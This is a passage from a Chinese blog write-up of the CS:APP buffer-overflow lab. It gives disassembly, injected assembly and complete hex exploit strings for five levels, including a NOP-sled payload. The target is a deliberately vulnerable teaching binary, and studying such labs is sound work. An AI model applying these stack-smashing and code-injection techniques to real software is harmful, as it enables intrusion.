%eax,(%esp)</span><br><span class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          call   <span class="number">8048</span>cfa &lt;Gets&gt;</span><br><span class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x1</span>,%eax</span><br><span class="line"> <span class="number">804920</span>a:       c9                      leave</span><br><span class="line"> <span class="number">804920b</span>:       c3                      ret</span><br></pre></td></tr></table></figure><br>从汇编代码中可以知道<code>buff</code>的偏移地址第<code>(0x28 + 8)</code>存储的为函数返回地址，所以我们只需要将<code>offset = (0x28 + 8)</code>的空间进行自定义填充即可，以下所有的题目基本上都类似的原理。</p><h3 id="1-Level-0-Candle"><a href="#1-Level-0-Candle" class="headerlink" title="1. Level 0: Candle"></a>1. Level 0: Candle</h3><ul><li>题目非常简单，只是要求能够正确执行函数<code>smoke</code>即可，我们只需要将<code>smoke</code>函数的地址写入<code>getbuf</code>的返回地址即可,我们只需要将<code>08048c18</code>写入返回地址即可。<br><img src="https://i.loli.net/2020/11/26/nJHl9QcwD3qMUzT.png" alt="1"><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">18</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span></span><br></pre></td></tr></table></figure><h3 id="2-Level-1-Sparkler"><a href="#2-Level-1-Sparkler" class="headerlink" title="2. Level 1: Sparkler"></a>2. Level 1: Sparkler</h3></li><li>题目非常简单，只是要求能够正确执行函数<code>fizz</code>即可，我们只需要将<code>fizz</code>函数的地址写入<code>getbuf</code>的返回地址即可,我们只需要将<code>08048c18</code>写入返回地址即可,与<code>level1</code>不一样的是还需要把参数<code>val</code>参数传入，并且此时参数的值为<code>cookie</code>的值，我们知道参数的偏移地址<code>offset = (0x28 + 12)</code>，我们只需要在此偏移处填入<code>cookie</code>的值即可。<br><img src="https://i.loli.net/2020/11/26/3W4eXo6zNFVnSCO.png" alt="2"><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">42</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span> <span class="number">08</span> d1 <span class="number">08</span> <span class="number">04</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><h3 id="3-Level-2-Firecracker"><a href="#3-Level-2-Firecracker" class="headerlink" title="3.Level 2: Firecracker"></a>3.Level 2: Firecracker</h3></li><li>这个稍微复杂点，只是要求能够正确执行函数<code>bang</code>，并且要求<code>global_value</code>的值与<code>cookie</code>的值相等，这就要求我们不仅返回执行<code>bang</code>函数，还需要对<code>global_value</code>的值进行更改。此题需要在栈上写入指令，并且执行栈上的指令修改全局变量的值，执行完成后跳转到<code>bang</code>函数即可。</li><li>我们通过C语言写入汇编代码，然后进行编译翻译成机器指令即可，再将填入到栈中即可，需要执行的指令如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov $0x6830c384, %eax"</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">"mov %eax,0x804d100"</span>);    <span class="comment">// global_value = cookie</span></span><br><span class="line">    __asm__(<span class="string">"push $0x08048c9d"</span>);      <span class="comment">// set bang return address</span></span><br><span class="line">    __asm__(<span class="string">"ret"</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/11/26/gzNHyfrudtTAWpq.png" alt="3"></li><li>本次即需要两次跳转，第一次跳转到栈上的指令起始地址<code>0x55682fb8</code>，设置全局变量；执行完成指令后进行第二次跳转到<code>bang</code>函数的入口地址<code>0x08048c9d</code>，最后的结果为：<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> a3 <span class="number">00</span> d1 <span class="number">04</span> <span class="number">08</span> <span class="number">68</span> <span class="number">9</span>d <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span> c3 <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> b8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-Level-3-Dynamite"><a href="#4-Level-3-Dynamite" class="headerlink" title="4. Level 3: Dynamite"></a>4. Level 3: Dynamite</h3><ul><li>这个就比较复杂，需要改变<code>test</code>函数的执行逻辑，这就要求我们不仅返回执行<code>bang</code>函数，还需要对<code>global_value</code>的值进行更改，并且保证<code>test</code>函数最终能够正常运行。<code>test</code>函数原本逻辑如下所示：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possible corruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval(); </span><br><span class="line"></span><br><span class="line">    val = getbuf(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval()) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has been corrupted\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>如果按照正常逻辑，<code>getbuf</code>的返回值为<code>1</code>,而本题要求<code>val == cookie</code>，这就要求返回值为<code>cookie</code>，我们通过修改<code>getbuf</code>的返回值为<code>cookie</code>即可。我们仔细阅读汇编代码如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8048</span>db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">80491f</span>4 &lt;getbuf&gt;</span><br><span class="line"><span class="number">8048</span>dbe:       <span class="number">89</span> c3                   mov    %eax,%ebx</span><br><span class="line"><span class="number">8048</span>dc0:       e8 cb ff ff ff          call   <span class="number">8048</span>d90 &lt;uniqueval&gt;</span><br></pre></td></tr></table></figure>函数的返回值实际存放在<code>%eax</code>寄存器中，我们只需要修改<code>%eax</code>寄存器的值为<code>cookie</code>即可。本题还有比较关键的一点，我们在进行写缓冲区时把<code>test</code>函数的<code>%ebp</code>寄存器破坏掉了，我们返回前还需要恢复<code>%ebp</code>寄存器即可，我们通过<code>gdb</code>调试可以知道<code>%ebp</code>寄存器的地址为<code>0X55683010</code>。恢复的地址和修改寄存器的代码如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov $0x6830c384, %eax"</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">"mov $0X55683010, %ebp"</span>); <span class="comment">// resume ebp register</span></span><br><span class="line">    __asm__(<span class="string">"push $0x08048dbe"</span>); <span class="comment">// set return address</span></span><br><span class="line">    __asm__(<span class="string">"ret"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>我们通过上述编译后，将代码写入到栈上即可，并同时将<code>getbuf</code>函数的返回地址设置为上述指令的起始地址即可。最终的<code>buffer</code>为：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> <span class="number">68</span> de <span class="number">8</span>d <span class="number">04</span> <span class="number">08</span> c3 <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> b8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="5-Level-4-Nitroglycerin"><a href="#5-Level-4-Nitroglycerin" class="headerlink" title="5. Level 4: Nitroglycerin"></a>5. Level 4: Nitroglycerin</h3><ul><li>本题与第<code>4</code>题相似，但是比较复杂的处理在于栈的地址为动态变换的，此时我们就不可能像之前处理那样，栈的返回地址直接写为固定，此时我们需要用到<code>nop sleds</code>。这个所谓的难点也并不复杂，表示我们可以将机器指令全部设置为<code>nop</code>,在<code>nop</code>之后紧挨着执行我们的修改指令，因此我们只需要保证跳转指令一定能够跳转到<code>nop</code>指令段中即可，题目中所谓的随机栈地址的范围变化为<code>[-240,240]</code>之间进行变动，我们只需要设定某个值保证跳转一定能够跳转到<code>nop</code>指令即可。</li><li>此处我们将<code>512</code>个字节的内容全部设置为<code>nop</code>,只要保证指令一定能够跳转<code>nop</code>区间即可，因为<code>nop</code>执行结束后紧挨着即为我们需要执行的指令。</li><li>我们同时还需要恢复<code>ebp</code>寄存器，我们仔细观察<code>ebp</code>寄存器实际为<code>esp</code>地址偏移<code>0x28</code>即可。因为地址从高往低增长，所以<code>$ebp = $esp + 28</code>，我们可以通过汇编代码得知。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08048e26</span> &lt;testn&gt;:</span><br><span class="line"> <span class="number">8048e26</span>:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">8048e27</span>:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048e29</span>:       <span class="number">53</span>                      push   %ebx</span><br><span class="line"> <span class="number">8048e2</span>a:       <span class="number">83</span> ec <span class="number">24</span>                sub    $<span class="number">0x24</span>,%esp</span><br><span class="line"> <span class="number">8048e2</span>d:       e8 <span class="number">5</span>e ff ff ff          call   <span class="number">8048</span>d90 &lt;uniqueval&gt;</span><br><span class="line"> <span class="number">8048e32</span>:       <span class="number">89</span> <span class="number">45</span> f4                mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">8048e35</span>:       e8 d2 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">804920</span>c &lt;getbufn&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov %esp,%eax"</span>); <span class="comment">// resume ebp register</span></span><br><span class="line">    __asm__(<span class="string">"add $0x28,%eax"</span>);</span><br><span class="line">    __asm__(<span class="string">"mov %eax,%ebp"</span>);</span><br><span class="line">    __asm__(<span class="string">"mov $0x6830c384, %eax"</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">"push $0x8048e3a"</span>); <span class="comment">// set return address</span></span><br><span class="line">    __asm__(<span class="string">"ret"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>我们通过上述编译后，将代码写入到栈上即可，并同时将<code>getbuf</code>函数的返回地址设置为<code>0x55682eb8</code>。最终的<code>buffer</code>为：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">89</span> e0 <span class="number">83</span> c0</span><br><span class="line"><span class="number">28</span> <span class="number">89</span> c5 b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> <span class="number">68</span> <span class="number">3</span>a</span><br><span class="line"><span class="number">8</span>e <span class="number">04</span> <span class="number">08</span> c3 b8 <span class="number">2</span>e <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>总的来说，<code>lab3</code>的代码比<code>lab2</code>有趣多了，非常考验逻辑思维能力，通过学习对机器指令的执行过程有了非常熟悉的了解，也对缓冲区攻击的基本原理有了深刻的理解，当然实际的攻击过程远远比这复杂的多。计算机技术需要学习的技巧太多了。</li></ul><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
